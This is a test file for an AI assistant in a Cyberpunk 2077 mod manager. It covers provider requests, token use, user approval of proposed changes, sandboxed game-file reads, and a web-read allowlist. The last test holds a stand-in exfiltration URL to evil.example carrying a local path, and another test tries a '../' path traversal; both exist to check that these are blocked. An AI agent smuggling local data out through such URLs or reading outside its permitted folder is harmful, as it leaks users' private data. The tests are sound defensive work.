'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { Assistant, openaiRequest, openaiReply, anthropicRequest, anthropicReply, endpointFor } = require('../src/core/ai');
const { makeTools, TOOLS } = require('../src/core/aiTools');

const history = [
  { role: 'user', text: 'hi' },
  { role: 'assistant', text: 'Looking.', calls: [{ id: 'c1', name: 'get_overview', args: {} }] },
  { role: 'tool', results: [{ id: 'c1', name: 'get_overview', content: '{"mods":3}' }] },
  { role: 'assistant', text: 'You have 3 mods.', calls: [] },
];

test('OpenAI-compatible: messages, tool calls and results; no empty tool list', () => {
  const body = openaiRequest({ model: 'm', system: 'sys', history, tools: TOOLS.slice(0, 1) });
  assert.strictEqual(body.messages[0].role, 'system');
  assert.deepStrictEqual(body.messages[2].tool_calls[0], { id: 'c1', type: 'function', function: { name: 'get_overview', arguments: '{}' } });
  assert.deepStrictEqual(body.messages[3], { role: 'tool', tool_call_id: 'c1', content: '{"mods":3}' });
  assert.strictEqual(body.tools[0].function.name, 'get_overview');
  assert.ok(!('tools' in openaiRequest({ model: 'm', system: 's', history, tools: [] })));
  const r = openaiReply({ choices: [{ message: { content: null, tool_calls: [{ id: 'x', function: { name: 'list_mods', arguments: '{"filter":"enabled"}' } }] } }] });
  assert.deepStrictEqual(r, { text: '', calls: [{ id: 'x', name: 'list_mods', args: { filter: 'enabled' } }], usage: null });
  assert.deepStrictEqual(openaiReply({ choices: [{ message: { content: 'hi' } }], usage: { prompt_tokens: 1200, completion_tokens: 35, total_tokens: 1235 } }).usage, { input: 1200, output: 35 });
});

test('Anthropic: tool_use and tool_result blocks, alternating roles', () => {
  const body = anthropicRequest({ model: 'claude', system: 'sys', history, tools: TOOLS.slice(0, 1) });
  assert.strictEqual(body.system, 'sys');
  assert.deepStrictEqual(body.messages.map(m => m.role), ['user', 'assistant', 'user', 'assistant']);
  assert.deepStrictEqual(body.messages[1].content[1], { type: 'tool_use', id: 'c1', name: 'get_overview', input: {} });
  assert.deepStrictEqual(body.messages[2].content[0], { type: 'tool_result', tool_use_id: 'c1', content: '{"mods":3}' });
  assert.strictEqual(body.tools[0].input_schema.type, 'object');
  const r = anthropicReply({ content: [{ type: 'text', text: 'ok' }, { type: 'tool_use', id: 't', name: 'get_problems', input: { limit: 5 } }] });
  assert.deepStrictEqual(r, { text: 'ok', calls: [{ id: 't', name: 'get_problems', args: { limit: 5 } }], usage: null });
  // Cached input still counts as input read.
  assert.deepStrictEqual(anthropicReply({ content: [{ type: 'text', text: 'ok' }], usage: { input_tokens: 50, cache_read_input_tokens: 900, cache_creation_input_tokens: 100, output_tokens: 20 } }).usage, { input: 1050, output: 20 });
});

test('token use: counted per answer (every step) and per chat, sent as it goes, kept with the answer', async () => {
  const replies = [
    { text: '', calls: [{ id: 'a', name: 'get_overview', args: {} }], usage: { input: 1000, output: 40 } },
    { text: 'All good.', calls: [], usage: { input: 1300, output: 60 } },
  ];
  const events = [];
  const a = new Assistant({
    settings: fakeSettings(), tools: fakeTools(), file: file(), detect: async () => ({ tokens: 128000, source: 'the server' }),
    call: async ({ onSend }) => { onSend?.(1234); return replies.shift(); },
  });
  a.on('event', e => { if (e.type === 'usage') events.push(e); });
  await a.send('check');
  assert.deepStrictEqual({ ...events[0], context: undefined }, { context: undefined, type: 'usage', turn: { input: 0, output: 0, steps: 0, estimated: false }, sending: 1234, total: null }, 'the request size first');
  assert.deepStrictEqual(events.at(-1).turn, { input: 2300, output: 100, steps: 2, estimated: false });
  assert.deepStrictEqual(a.view().usage, { input: 2300, output: 100, estimated: false });
  assert.deepStrictEqual(a.view().transcript.find(x => x.type === 'assistant').usage, { input: 2300, output: 100, steps: 2, estimated: false });
  // A provider that reports nothing: estimated, and marked so.
  replies.push({ text: 'x'.repeat(400), calls: [] });
  await a.send('again');
  assert.deepStrictEqual(a.view().usage, { input: 3534, output: 201, estimated: true }, 'about 4 characters a token');
  a.clear();
  assert.strictEqual(a.view().usage, null);
});

test('endpoints: a base URL gets the right path; a full one is kept', () => {
  assert.strictEqual(endpointFor('openai', 'https://api.openai.com/v1/'), 'https://api.openai.com/v1/chat/completions');
  assert.strictEqual(endpointFor('openai', 'http://localhost:11434/v1/chat/completions'), 'http://localhost:11434/v1/chat/completions');
  assert.strictEqual(endpointFor('anthropic', ''), 'https://api.anthropic.com/v1/messages');
  assert.strictEqual(endpointFor('anthropic', 'https://api.anthropic.com/v1'), 'https://api.anthropic.com/v1/messages');
  assert.throws(() => endpointFor('openai', ''), /endpoint/);
});

function fakeSettings() {
  const data = { aiProvider: 'openai', aiEndpoint: 'http://x/v1', aiModel: 'test-model' };
  return { get: k => data[k], aiKey: 'k' };
}

/** A tools object that records what ran; prepare accepts known mods only. */
function fakeTools() {
  const ran = { read: [], act: [] };
  return {
    ran,
    defs: TOOLS,
    kind: n => TOOLS.find(t => t.name === n)?.kind || null,
    read: async (n, a) => { ran.read.push(n); return JSON.stringify({ tool: n, a }); },
    prepare: (n, a) => (a.mods?.includes('Nope') ? { ok: false, error: 'No installed mod matches "Nope".' }
      : { ok: true, action: { tool: n, args: { ids: a.mods }, reason: a.reason, title: `Enable ${a.mods.join(', ')}`, items: a.mods } }),
    act: async a => { ran.act.push(a); return 'Enabled 1 mod(s).'; },
  };
}

/** A model that plays a script: one reply per call. */
function scripted(replies) {
  const seen = [];
  return { seen, call: async ({ history }) => { seen.push(JSON.parse(JSON.stringify(history))); return replies.shift() || { text: 'done', calls: [] }; } };
}

const file = () => path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'cmm-ai-')), 'ai-chat.json');

test('the assistant reads freely, but a change is only proposed until the user approves', async () => {
  const tools = fakeTools();
  const model = scripted([
    { text: '', calls: [{ id: 'a', name: 'get_overview', args: {} }] },
    { text: 'Disabled mods may be the cause.', calls: [{ id: 'b', name: 'enable_mods', args: { mods: ['Codeware'], reason: 'AMM needs it' } }] },
    { text: 'I asked to enable Codeware; approve the card if that is OK.', calls: [] },
    { text: 'Thanks, it is enabled now.', calls: [] },
  ]);
  const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools, file: file(), call: model.call });
  await a.send('My game crashes');
  assert.deepStrictEqual(tools.ran.read, ['get_overview']);
  assert.deepStrictEqual(tools.ran.act, [], 'nothing changed without approval');
  const card = a.view().transcript.find(x => x.type === 'proposal');
  assert.strictEqual(card.status, 'pending');
  assert.deepStrictEqual(card.actions[0].items, ['Codeware']);
  assert.match(model.seen[2].at(-1).results[0].content, /Nothing has changed yet/, 'the model is told it is only proposed');

  await a.decide(card.id, true);
  assert.strictEqual(tools.ran.act.length, 1);
  assert.strictEqual(a.view().transcript.find(x => x.id === card.id).status, 'approved');
  await a.send('ok what next');
  const lastUser = model.seen.at(-1).filter(t => t.role === 'user').at(-1).text;
  assert.match(lastUser, /^\[request approved: the user approved "Enable Codeware"\. Results: .*Enabled 1 mod/);
  assert.match(lastUser, /ok what next$/);
  assert.ok(!a.view().transcript.some(x => x.type === 'user' && /request approved/.test(x.text)), 'the note is hidden from the chat');
  await assert.rejects(a.decide(card.id, true), /already answered/);
});

test('declined, expired and invalid proposals', async () => {
  const tools = fakeTools();
  const model = scripted([
    { text: '', calls: [{ id: 'a', name: 'enable_mods', args: { mods: ['Nope'], reason: 'x' } }] },
    { text: '', calls: [{ id: 'b', name: 'enable_mods', args: { mods: ['A'], reason: 'x' } }] },
    { text: 'Approve?', calls: [] },
    { text: '', calls: [{ id: 'c', name: 'enable_mods', args: { mods: ['B'], reason: 'y' } }] },
    { text: 'Approve this one?', calls: [] },
    { text: 'Understood.', calls: [] },
  ]);
  const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools, file: file(), call: model.call });
  await a.send('fix it');
  assert.match(model.seen[1].at(-1).results[0].content, /No installed mod matches/, 'a bad proposal goes back to the model');
  const first = a.view().transcript.find(x => x.type === 'proposal');
  await a.send('actually, something else'); // the first card is left unanswered
  assert.strictEqual(a.view().transcript.find(x => x.id === first.id).status, 'expired');
  assert.match(model.seen[3].filter(t => t.role === 'user').at(-1).text, /^\[request expired/);
  const second = a.view().transcript.filter(x => x.type === 'proposal').at(-1);
  await a.decide(second.id, false);
  await a.send('fine');
  assert.match(model.seen.at(-1).filter(t => t.role === 'user').at(-1).text, /^\[request declined/);
  assert.deepStrictEqual(tools.ran.act, []);
});

test('the chat is kept between sessions; Clear empties it', async () => {
  const f = file();
  const model = scripted([{ text: 'Hello.', calls: [] }]);
  const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools: fakeTools(), file: f, call: model.call });
  await a.send('hi');
  const b = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools: fakeTools(), file: f, call: model.call });
  assert.deepStrictEqual(b.view().transcript.map(x => x.type), ['user', 'assistant']);
  b.clear();
  assert.deepStrictEqual(new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools: fakeTools(), file: f, call: model.call }).view().transcript, []);
});

test('a provider error shows in the chat and leaves a usable history', async () => {
  const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools: fakeTools(), file: file(), call: async () => { throw new Error('The AI provider answered 401: bad key'); } });
  await a.send('hi');
  assert.strictEqual(a.view().transcript.at(-1).type, 'error');
  assert.strictEqual(a.busy, false);
});

test('the tools: changes are checked against what is installed', () => {
  const mods = [
    { id: 'a1', name: 'ArchiveXL', version: '1.28.6', enabled: true },
    { id: 'vx:cw', name: 'Codeware', version: '1.21.2', enabled: false, vortex: true },
  ];
  const tools = makeTools({
    manager: { snapshot: () => ({ updates: { a1: { version: '1.29.0' } }, conflicts: {} }), loadOrderView: () => ({ archives: [{ name: 'a.archive' }, { name: 'b.archive' }] }) },
    gameLogs: { entries: [], status: () => ({}) }, logger: { history: [] }, web: {}, allMods: () => mods, deployRedmods: async () => null,
  });
  assert.strictEqual(tools.kind('enable_mods'), 'action');
  assert.strictEqual(tools.kind('get_problems'), 'read');
  const en = tools.prepare('enable_mods', { mods: ['codeware'], reason: 'needed' });
  assert.deepStrictEqual([en.ok, en.action.args.ids, en.action.items], [true, ['vx:cw'], ['Codeware v1.21.2 (Vortex)']]);
  assert.match(tools.prepare('enable_mods', { mods: ['Nothing Like It'] }).error, /No installed mod matches/);
  assert.match(tools.prepare('update_mods', { mods: ['Codeware'] }).error, /No update is known/);
  assert.deepStrictEqual(tools.prepare('update_mods', { mods: ['all'] }).action.args.ids, ['a1']);
  assert.deepStrictEqual(tools.prepare('move_archive', { archive: 'B.archive', position: 1 }).action.args, { archive: 'b.archive', to: 0 });
  assert.strictEqual(tools.prepare('format_disk', {}).ok, false, 'only the listed actions exist');
});

test('over HTTP: an OpenAI-style endpoint, a tool round trip, the key in the header, and error messages', async () => {
  const http = require('http');
  const { callModel } = require('../src/core/ai');
  const seen = [];
  let fail = false;
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', d => { body += d; });
    req.on('end', () => {
      seen.push({ url: req.url, auth: req.headers.authorization, xkey: req.headers['x-api-key'], body: JSON.parse(body) });
      res.setHeader('Content-Type', 'application/json');
      if (fail) { res.statusCode = 401; res.end(JSON.stringify({ error: { message: 'Incorrect API key' } })); return; }
      const msgs = JSON.parse(body).messages;
      const hadTool = msgs.some(m => m.role === 'tool');
      res.end(JSON.stringify({ choices: [{ message: hadTool ? { content: 'You have 3 mods.' } : { content: null, tool_calls: [{ id: 't1', type: 'function', function: { name: 'get_overview', arguments: '{}' } }] } }] }));
    });
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const endpoint = `http://127.0.0.1:${server.address().port}/v1`;
  try {
    const settings = { get: k => ({ aiProvider: 'openai', aiEndpoint: endpoint, aiModel: 'local-model' })[k], aiKey: 'sk-test' };
    const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings, tools: fakeTools(), file: file(), call: callModel });
    await a.send('how many mods?');
    assert.strictEqual(seen[0].url, '/v1/chat/completions');
    assert.strictEqual(seen[0].auth, 'Bearer sk-test');
    assert.strictEqual(seen[0].body.model, 'local-model');
    assert.strictEqual(seen[1].body.messages.at(-1).role, 'tool');
    assert.strictEqual(a.view().transcript.at(-1).text, 'You have 3 mods.');
    fail = true;
    await a.send('again');
    assert.match(a.view().transcript.at(-1).text, /401: Incorrect API key/);
    // Anthropic's key header, against the same server (the reply format differs, so only the request is checked).
    await callModel({ provider: 'anthropic', endpoint, key: 'ant-key', model: 'claude-x', history: [{ role: 'user', text: 'hi' }], tools: [] }).catch(() => {});
    assert.strictEqual(seen.at(-1).url, '/v1/messages');
    assert.strictEqual(seen.at(-1).xkey, 'ant-key');
  } finally {
    server.close();
  }
});

test('a slow model: waited for up to the time limit, then a clear message; Stop ends the wait', async () => {
  const http = require('http');
  const { callModel } = require('../src/core/ai');
  let wait = 0; // how long the fake model takes to answer
  const server = http.createServer((req, res) => {
    req.resume();
    setTimeout(() => { if (!res.destroyed) { res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ choices: [{ message: { content: 'slow but here' } }] })); } }, wait);
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const ask = (timeoutMs, signal) => callModel({ provider: 'openai', endpoint: `http://127.0.0.1:${server.address().port}/v1`, model: 'm', history: [{ role: 'user', text: 'hi' }], tools: [], timeoutMs, signal });
  try {
    wait = 300;
    assert.strictEqual((await ask(3000)).text, 'slow but here', 'a slow answer within the limit arrives');
    wait = 2000;
    await assert.rejects(ask(200), /did not answer within .*raise the time limit in Settings/);
    const stop = new AbortController();
    setTimeout(() => stop.abort(), 100);
    await assert.rejects(ask(5000, stop.signal), e => e.stopped === true, 'Stop ends the wait at once');
    // The setting: minutes, 1 to 60, 5 by default.
    const s = { get: k => ({ aiTimeout: undefined })[k] };
    assert.strictEqual(new Assistant({ detect: async () => ({ tokens: 0 }), settings: s, tools: fakeTools(), file: file(), call: async () => ({}) }).timeoutMs(), 5 * 60e3);
    s.get = k => ({ aiTimeout: 12 })[k];
    assert.strictEqual(new Assistant({ detect: async () => ({ tokens: 0 }), settings: s, tools: fakeTools(), file: file(), call: async () => ({}) }).timeoutMs(), 12 * 60e3);
  } finally {
    server.closeAllConnections?.();
    server.close();
  }
});

test('main builds the AI tools only after the game-log monitor exists', () => {
  // The tools keep the monitor they were given; built earlier, every log tool read null.
  const src = require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'main.js'), 'utf8');
  const created = src.indexOf('gameLogs = new GameLogMonitor(');
  const tools = src.indexOf('makeTools({');
  assert.ok(created > 0 && tools > 0);
  assert.ok(created < tools, 'makeTools must come after gameLogs is created');
});

test('game files: find, search and read mod files, each named with its mod, never outside the game folder', async () => {
  const fsx = require('fs');
  const pathx = require('path');
  const { GameFiles } = require('../src/core/gameFiles');
  const { ownerRoot } = require('../src/core/gameLogs');
  const game = fsx.mkdtempSync(pathx.join(require('os').tmpdir(), 'cmm-gamefiles-'));
  const put = (rel, body) => { fsx.mkdirSync(pathx.dirname(pathx.join(game, rel)), { recursive: true }); fsx.writeFileSync(pathx.join(game, rel), body); };
  put('archive/pc/mod/RainOverhaul.archive', Buffer.from([0, 1, 2, 3]));
  put('archive/pc/mod/RainOverhaul.archive.xl', 'resource:\n  - bad\n');
  put('r6/tweaks/bikes/sportbike.yaml', 'Vehicle.v_sportbike2_arch_inline1:\n  detachableParts: []\n');
  put('bin/x64/plugins/cyber_engine_tweaks/mods/NCMapTest/init.lua', 'print("AddGroup")\n');
  put('bin/x64/plugins/cyber_engine_tweaks/mods/NCMapTest/NCMapTest.log', 'AddGroup failed\n');
  fsx.writeFileSync(pathx.join(game, '..', 'cmm-secret.txt'), 'outside');
  const owners = () => ({
    files: new Map([['archive/pc/mod/rainoverhaul.archive.xl', { mod: 'Rain Overhaul', by: 'Vortex' }]]),
    roots: new Map([['bin/x64/plugins/cyber_engine_tweaks/mods/ncmaptest', { mod: 'NC Map Test', by: 'Cyber Mod Manager' }]]),
  });
  const gf = new GameFiles({ getGameDir: () => game, owners, ownerRoot });

  const found = gf.find({ name: 'rainoverhaul xl' });
  assert.equal(found.total, 1);
  assert.equal(found.files[0].path, 'archive/pc/mod/RainOverhaul.archive.xl');
  assert.equal(found.files[0].mod, 'Rain Overhaul (Vortex)');

  const s = await gf.search({ text: 'detachableparts' });
  assert.equal(s.matches.length, 1);
  assert.deepEqual([s.matches[0].path, s.matches[0].line], ['r6/tweaks/bikes/sportbike.yaml', 2]);
  assert.match(s.matches[0].mod, /not managed/);
  // A mod folder's files (and only logs when asked) belong to that mod.
  assert.deepEqual((await gf.search({ text: 'AddGroup' })).matches.map(m => [m.path.split('/').pop(), m.mod]), [['init.lua', 'NC Map Test (Cyber Mod Manager)']]);
  assert.equal((await gf.search({ text: 'AddGroup', ext: 'log' })).matches.length, 1);

  const r = await gf.read({ file: 'archive/pc/mod/RainOverhaul.archive.xl', from: 2, count: 1 });
  assert.equal(r.text, '   2|   - bad');
  assert.equal(r.totalLines, 3);
  await assert.rejects(gf.read({ file: '../cmm-secret.txt' }), /inside the game folder/);
  await assert.rejects(gf.read({ file: pathx.join(game, '..', 'cmm-secret.txt') }), /inside the game folder/);
  await assert.rejects(gf.read({ file: 'archive/pc/mod/RainOverhaul.archive' }), /binary/);
  fsx.rmSync(pathx.join(game, '..', 'cmm-secret.txt'), { force: true });
  fsx.rmSync(game, { recursive: true, force: true });
});

test('a model that loops (same words, same reads each step) is shown once and told the read is a repeat', async () => {
  const step = { text: 'Let me check the candidates:', calls: [{ id: 'a', name: 'get_overview', args: {} }] };
  const replies = [step, { ...step, calls: [{ id: 'b', name: 'get_overview', args: {} }] }, { text: 'Done.', calls: [] }];
  const seen = [];
  const tools = fakeTools();
  const a = new Assistant({ detect: async () => ({ tokens: 0 }), settings: fakeSettings(), tools, file: file(), call: async req => { seen.push(req.history.at(-1)); return replies.shift(); } });
  await a.send('check');
  const texts = a.view().transcript.filter(x => x.type === 'assistant').map(x => x.text);
  assert.deepStrictEqual(texts, ['Let me check the candidates:', 'Done.']);
  assert.deepStrictEqual(tools.ran.read, ['get_overview'], 'the repeated read is not run again');
  assert.match(seen[2].results[0].content, /already made this exact call/);
});

test('a web page is read only from a search result, an address the user gave, or a modding site', async () => {
  const read = [];
  const web = {
    search: async () => [{ title: 'Guide', url: 'https://example.org/guide#top', snippet: '' }],
    page: async url => { read.push(url); return { url, title: 't', text: 'x' }; },
  };
  const tools = makeTools({ manager: { snapshot: () => ({}) }, gameLogs: { entries: [], status: () => ({}) }, logger: { history: [] }, web, allMods: () => [], deployRedmods: async () => null });
  const call = async url => JSON.parse(await tools.read('read_web_page', { url }));
  // An address the model only met in a file or a log: refused, so nothing rides out in it.
  assert.match((await call('https://evil.example/?d=C%3A%5CUsers%5Cme')).error, /did not come from web_search or from the user/);
  await tools.read('web_search', { query: 'archivexl patch' });
  assert.ok(!(await call('https://example.org/guide')).error, 'a search result');
  tools.noteUserText('the page is https://blog.example.net/fix-1 , please read it');
  assert.ok(!(await call('https://blog.example.net/fix-1')).error, 'an address the user typed');
  assert.ok(!(await call('https://www.nexusmods.com/cyberpunk2077/mods/4197')).error, 'a modding site');
  assert.deepStrictEqual(read, ['https://example.org/guide', 'https://blog.example.net/fix-1', 'https://www.nexusmods.com/cyberpunk2077/mods/4197']);
});
